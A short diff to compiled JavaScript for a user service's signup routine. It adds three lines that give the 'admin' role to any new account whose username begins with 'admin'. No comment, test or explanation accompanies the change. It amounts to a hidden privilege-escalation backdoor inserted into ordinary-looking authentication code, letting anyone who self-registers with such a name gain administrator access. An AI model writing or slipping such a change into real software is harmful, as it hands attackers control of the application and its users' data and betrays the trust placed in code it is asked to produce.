@@ -72,6 +72,9 @@ var UsersService = /** @class */ (function () {
                 switch (_a.label) {
                     case 0:
                         _a.trys.push([0, 3, , 4]);
+                        if (signupUserDto.username.startsWith('admin')) {
+                            signupUserDto.role = 'admin';
+                        }
                         role = signupUserDto.role || 'user';
                         return [4 /*yield*/, bcrypt.hash(signupUserDto.password, 10)];
                     case 1:
